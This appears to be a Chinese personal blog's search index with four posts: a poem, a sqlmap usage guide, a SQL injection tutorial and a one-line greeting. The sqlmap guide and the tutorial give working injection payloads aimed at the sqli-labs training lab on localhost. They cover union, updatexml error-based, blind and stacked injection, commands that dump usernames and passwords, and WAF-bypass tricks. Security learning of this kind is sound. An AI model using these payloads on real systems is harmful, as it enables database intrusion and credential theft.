<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>无题</title>
      <link href="/post/9b44950b.html"/>
      <url>/post/9b44950b.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>你路过我的春光明媚</p><p>离开我的望穿秋水</p><p>当雾气锁住凝眉</p><p>当笛声告别夕炊</p><p>最好你舍得我送别的眼</p><p>从此一去不回</p><p>最好我忘掉你流水的心</p><p>再无浊酒一杯</p><p>当我赶起羊群踏尽青草</p><p>当你忘了路过此地朝朝暮暮</p><p>天晓得柔情似水</p><p>妄想谁泪眼愁眉</p><p>等到所有的故事都死去</p><p>我爱过的人都成灰</p><p>有的变成河水</p><p>有的变成眼泪</p><p>该请谁来聆听</p><p>荒野的风声吹向月亮</p><p>我心如荒野    凛风不歇</p><p>该请谁来触及</p><p>青山的恻隐藏了四季</p><p>我身如青山    瘦贫瘠该</p><p>请谁来抵达</p><p>镜中青花结成了白发</p><p>我灵魂如镜    虚罄年华</p><p>该请谁来行歌</p><p>长河两侧的落落景色</p><p>我生如长河    终生奔波</p><p>终生    一无所获</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 我同桌的文集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用方法</title>
      <link href="/post/11f9f536.html"/>
      <url>/post/11f9f536.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h1><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。</p><h1 id="用于数据库注入"><a href="#用于数据库注入" class="headerlink" title="用于数据库注入"></a>用于数据库注入</h1><ol><li>猜解是否能注入</li></ol><blockquote><p>python sqlmap.py -u “url”</p></blockquote><ol start="2"><li>猜解库</li></ol><blockquote><p>python sqlmap.py -u “url” –dbs</p></blockquote><ol start="3"><li>猜解表</li></ol><blockquote><p>python sqlmap.py -u “url” –tables</p></blockquote><ol start="4"><li>根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)</li></ol><blockquote><p>python sqlmap.py -u “url” –columns -T admin</p></blockquote><ol start="5"><li>根据字段猜解内容(假如通过3得到字段为username和password)</li></ol><blockquote><p>python sqlmap.py -u “url” –dump -T admin -C “username,password”</p></blockquote><h1 id="用于cookie注入"><a href="#用于cookie注入" class="headerlink" title="用于cookie注入"></a>用于cookie注入</h1><ol><li>cookie注入，猜解表</li></ol><blockquote><p>python sqlmap.py -u “url” –cookie “cookie” –table –level 2</p></blockquote><ol start="2"><li>猜解字段，(通过1的表猜解字段，假如表为admin)</li></ol><blockquote><p>python sqlmap.py -u “url” –cookie “cookie” –columns -T admin –level 2</p></blockquote><ol start="3"><li>猜解内容</li></ol><blockquote><p>python sqlmap.py -u “url” –cookie “cookie” –dump -T admin -C “username,password” –level 2</p></blockquote><h1 id="post登录框注入"><a href="#post登录框注入" class="headerlink" title="post登录框注入"></a>post登录框注入</h1><ol><li>浏览器打开目标地址</li><li>burp抓包，拦截请求</li><li>点击提交，burp会拦截post请求</li><li>复制post请求头为post.txt，并放到sqlmap目录下</li><li>运行sqlmap</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">step1：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;]  <span class="operator">/</span><span class="operator">/</span>测试是否存在注入</span><br><span class="line">step2：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="comment">--current-db //查询当前数据库</span></span><br><span class="line">step3：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="operator">-</span>D [&quot;数据库名&quot;] <span class="comment">--tables //查询当前数据库的所有表</span></span><br><span class="line">step4：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="operator">-</span>D [&quot;数据库名&quot;] <span class="operator">-</span>T [&quot;表名&quot;] <span class="comment">--columns //查询指定库指定表的所有字段</span></span><br><span class="line">step5：sqlmap <span class="operator">-</span>r [&quot;请求头文本&quot;] <span class="operator">-</span>D [&quot;数据库名&quot;] <span class="operator">-</span>T [&quot;表名&quot;] <span class="operator">-</span>C [&quot;字段名&quot;] <span class="comment">--dump //打印出指定库指定表指定字段的所有字段内容</span></span><br></pre></td></tr></table></figure><h1 id="常见参数使用"><a href="#常见参数使用" class="headerlink" title="常见参数使用"></a>常见参数使用</h1><ul><li>设置目标URL：</li></ul><blockquote><p>参数：-u    每次只能扫描一个url<br>格式：sqlmap -u “url”</p><p>参数：-m    从文本中获取多个目标扫描，但是每次只能有一个url<br>格式：sqlmap -m 1.txt、</p><p>参数：-r    从文件中加载HTTP请求，这样的话，就不需要再去设定coolie，POST数据等值…..<br>格式：sqlmap -r 1.txt</p></blockquote><ul><li>设置回显等级：</li></ul><blockquote><p>参数：-v<br>0、只显示python错误以及严重的信息。<br>1、同时显示基本信息和警告信息。（默认等级）<br>2、同时显示debug信息。<br>3、同时显示注入的payload。<br>4、同时显示HTTP请求。<br>5、同时显示HTTP响应头。<br>6、同时显示HTTP响应页。</p></blockquote><ul><li>设定探测等级：</li></ul><blockquote><p>参数：–level<br>默认为1<br>level&gt;=2的时候就会测试HTTP Cookie<br>level&gt;=3的时候就会测试HTTP User-Agent/Referer头<br>level=5的时候会测试HTTP Host</p></blockquote><h1 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h1><h3 id="options类："><a href="#options类：" class="headerlink" title="options类："></a>options类：</h3><blockquote><p>sqlmap –version    查看sqlmap版本信息.</p><p>-h    查看功能参数(常用的)</p><p>-hh　查看所有的参数 (如果有中文包 就最好了)</p><p>-v　显示更详细的信息 一共7级, 从0-6.默认为1, 数值越大,信息显示越详细.</p></blockquote><h3 id="Target-指定目标"><a href="#Target-指定目标" class="headerlink" title="Target(指定目标):"></a>Target(指定目标):</h3><blockquote><p>-d　直接连接数据库侦听端口,类似于把自己当一个客户端来连接.</p><p>-u    指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 </p><p>-l    指定logfile文件进行扫描,可以结合burp 把访问的记录保存成一个log文件, sqlmap可以直接加载burp保存到log文件进行扫描</p><p>-x    以xml的形式提交一个站点地图给sqlmap(表示不理解..)</p><p>-m    如果有多个url地址,可以把多个url保存成一个文本文件 -m可以加载文本文件逐个扫描</p><p>-r    把http的请求头,body保存成一个文件 统一提交给sqlmap,sqlmap会读取内容进行拼接请求体</p><p>-g    利用谷歌搜索引擎搭配正则来过滤你想要的</p><p>-c    加载配置文件,配置文件可以指定扫描目标,扫描方式,扫描内容等等.加载了配置文件sqlmap就会根据文件内容进行特定的扫描</p></blockquote><h3 id="Request类参数"><a href="#Request类参数" class="headerlink" title="Request类参数"></a>Request类参数</h3><blockquote><p>–data    提交的时候要携带的参数（get，post通用，最简单的post请求方式）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/post/e73517db.html"/>
      <url>/post/e73517db.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><blockquote><p>SQL 注入就是指 web应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 sql语句来实现 对数据库的任意操作。</p></blockquote><h2 id="SQL注入攻击思路"><a href="#SQL注入攻击思路" class="headerlink" title="SQL注入攻击思路"></a>SQL注入攻击思路</h2><blockquote><ol><li>判断是否存在注入</li><li>判断注入类型</li><li>猜解语句中的字段数</li><li>判断回显位置</li><li>爆数据库名</li><li>爆表名</li><li>爆字段名</li><li>查找内容</li></ol></blockquote><h2 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h2><blockquote><p>最为经典的单引号判断法：<br>在参数后面加上单引号,比如: <code>http://xxx/abc.php?id=1&#39;</code> 如果页面返回错误，则存在SQL注入。<br>原因是无论字符型还是整型都会因为单引号个数不匹配而报错。</p></blockquote><h2 id="判断SQL注入类型"><a href="#判断SQL注入类型" class="headerlink" title="判断SQL注入类型"></a>判断SQL注入类型</h2><p>类型分为两种：数字型和字符型</p><ul><li>数字型判断：<br>可以使用经典的 and 1=1 和 and 1=2 来判断：</li></ul><blockquote><p>url中输入？id=1 and 1=1 页面依旧正常运行，继续下一步<br>url中输入？id=1 and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。</p></blockquote><ul><li>字符型判断：<br>可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：</li></ul><blockquote><p>url中输入1’ and ‘1’ = ‘1,页面运行正常，继续进行下一步。<br>url中继续输入1’ and ‘1’ = ‘2,页面运行错误，则说明此 Sql 注入为字符型注入。</p></blockquote><h2 id="常见的注入方式"><a href="#常见的注入方式" class="headerlink" title="常见的注入方式"></a>常见的注入方式</h2><blockquote><p>联合注入</p><p>布尔盲注</p><p>时间盲注</p><p>宽字节注入</p><p>报错注入</p><p>堆叠注入</p><p>二次注入</p><p>……</p></blockquote><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>注入一般流程：</p><blockquote><ol><li>判断注入点</li><li>判断字段数</li><li>判断回显位置</li><li>爆破库名</li><li>爆破表名</li><li>爆破字段名</li><li>爆破字段值</li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">以<span class="keyword">sql</span><span class="operator">-</span>libs<span class="operator">/</span>Less<span class="number">-1</span>为例</span><br><span class="line">(<span class="number">1</span>)判断注入点</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>www.sql.com<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+</span></span><br><span class="line"><span class="string">payload： http://localhost/www.sql.com/Less-1/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">根据页面回显不同，判断id参数存在<span class="keyword">sql</span>注入</span><br><span class="line">(<span class="number">2</span>)判断字段数 <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>www.sql.com<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by x --+</span></span><br><span class="line"><span class="string">发现x=3时有回显，x=4时无回显，判断出存在三列</span></span><br><span class="line"><span class="string">(3)判断回显位置 union select需将参数的数据值设为不存在</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+ </span></span><br><span class="line">判断出回显位置为<span class="number">2</span>，<span class="number">3</span></span><br><span class="line">(<span class="number">4</span>)爆破库名 在回显位置替换参数即可</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 --+ </span></span><br><span class="line"><span class="string">(5)爆破表名 </span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span> <span class="comment">--+ </span></span><br><span class="line">(<span class="number">6</span>)爆破字段名</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),3 --+ </span></span><br><span class="line"><span class="string">(7)爆破字段值</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username,<span class="number">0x3a</span>,password) <span class="keyword">from</span> users),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>应用场景：查询不回显内容，会打印错误信息</p><blockquote><p>常用函数：floor(),updatexml(),extractvalue()</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">以updatexml()为例</span><br><span class="line">(<span class="number">1</span>)爆表 修改 limit <span class="number">0</span>,<span class="number">1</span> 参数 依次爆出所有表名</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span></span><br><span class="line"><span class="string">(2)爆字段名</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">通过修改limit参数，获取所有字段名</span><br><span class="line">(<span class="number">3</span>)爆字段值</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+</span></span><br><span class="line"><span class="string">通过修改limit参数，获取所有字段值</span></span><br><span class="line"><span class="string">(4)爆对应的密码</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;Dumb&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">通过修改limit参数，获取所有字段值</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>应用场景：</p><blockquote><p>代码存在sql注入漏洞，然而页面不会显数据，也不会显错误信息。只返回”right” 与wrong 这里我们可以通过构造语句，来判断数据库信息的正确性，在通过页面的“真”和“假”来识别我们的判断是否正确，这就是布尔盲注。</p></blockquote><p>常用函数：</p><blockquote><p>left()       left(database(),1)&gt;’s’    database()显示数据库名称，left(a,b)从左侧截取a的前b位。<br> regexp           select user() regexp ‘^r’  正则表达式用法 user()结果为root,regexp为匹配root的正则表达式<br>like         select users() like ‘’ro%’   与regexp类似，使用like进行匹配<br>substr函数   ascii() 函数    ascii(substr(select database()),1,1)=98 从1位置开始截取数据库名字的1个长度，ascii()将字符转化为ascii值。<br> ord()   mid()     mid(a,b,c)<br>ord(mid((select user()),1,1))=114<br>从位置b开始，截取a字符串的c位，ord()函数通ascii()，将字符转为ascii值。</p></blockquote><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注是什么？</p><blockquote><p>通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如：在SQL语句中使用sleep()函数</p><p>看加载页面的时间来判断注入点</p><p>适用场景：没有回显，甚至连注入语句是否执行都无从得知</p></blockquote><p>常用函数：</p><blockquote><p>sleep() – 返回0 命令中断返回1<br>substr(a,b,c) – 从b为止开始截取字符串a的c长度<br>mid() – 与substr完全一致<br>count() – 计算总数<br>ascii() – 返回第一个字符的ASII码<br>ord() – 与ascii完全一致<br>length() – 返回字符串的长度<br>left() – 从左往右截取字符串<br>right() –从右往左截取字符串<br>if(condition,true,false)：condition为条件，条件为真返回true，条件为假返回false</p></blockquote><p>注入一般流程：</p><blockquote><p>先用length()获取数据库长度<br>用substr() and sleep() 来确定每一个字符，从而确定数据库</p></blockquote><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><blockquote><p>原理介绍： 在SQL中，分号（;）是用来表示一条sql语句的结束。</p></blockquote><blockquote><p>联合注入也是将两条语句合并在一起，两者之间有什么区别么？<br>区别就在于union或者unionall执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 </p></blockquote><blockquote><p>局限性： 使用该注入，需要知道数据库的一些信息，例如表名，列名等。<br>并不是每种环境都可以使用。<br>oracle数据库不行，mysql、mssql‘postgresql可以。  </p></blockquote><blockquote><p>应用实例：已经爆破出管理员密码，但是是加密存储，且无法解密。可以使用堆叠注入，在该表中注入 </p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">举个栗子</span><br><span class="line">;<span class="keyword">select</span> if(length(database())<span class="operator">&gt;</span><span class="number">1</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line">;<span class="keyword">select</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><blockquote><p>原理 分为两步：<br>第一步：插入恶意数据<br>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行转义，在写入数据库时还是保留用户输入的数据，但是该数据中包含恶意内容。 </p><p>第二步：引用恶意数据<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。 </p></blockquote><blockquote><p>例如：<br>输入参数1’     参数经过转义函数变为1&#39;    参数进入数据库存储还原为1’<br>寻找另一处引用这个数据的操作<br>将1’从数据库中取出       取出后直接给变量并且带入SQL   SQL注入触发 实战   sql-lib 24 1.在创建用户界面 创建 admin’#  123 账号 2.登录  admin ‘#  123 账号 修改admin’#密码为  123456 3.发现 admin 密码变为123456</p></blockquote><blockquote><p>实战   sql-lib 24<br>1.在创建用户界面 创建 admin’#  123 账号<br>2.登录  admin ‘#  123 账号 修改admin’#密码为  123456<br>3.发现 admin 密码变为123456</p></blockquote><h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><ul><li>注入符号绕过<br>常见的注释符号有</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 注释内容</span></span><br><span class="line"># 注释内容</span><br><span class="line"><span class="comment">/*注释内容*/</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><ul><li>大小写绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举个例子</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><ul><li>内联注释绕过</li><li>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举个例子</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="comment">/*!select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><ul><li><p>双写关键字绕过<br>将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</p></li><li><p>十六进制绕过</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">举个例子</span><br><span class="line">test1等价于<span class="number">0x7465737431</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="number">0x7465737431</span>;</span><br></pre></td></tr></table></figure><ul><li>空格过滤绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line">()</span><br><span class="line">回车(url编码中的<span class="operator">%</span><span class="number">0</span>a)</span><br><span class="line">`(tap键上面的按钮)</span><br><span class="line">tap</span><br><span class="line">两个空格</span><br></pre></td></tr></table></figure><ul><li>过滤or and xor not 绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">=</span> <span class="operator">||</span></span><br><span class="line">xor <span class="operator">=</span> <span class="operator">|</span> # 异或</span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span> <span class="operator">!</span></span><br></pre></td></tr></table></figure><ul><li>过滤等号=绕过<br>不加通配符的like执行的效果和=一致，所以可以用来绕过。<br>利用大小于号、!配合使用进行绕过</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World！</title>
      <link href="/post/24608.html"/>
      <url>/post/24608.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>去没人的岛，摸鲨鱼的角。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
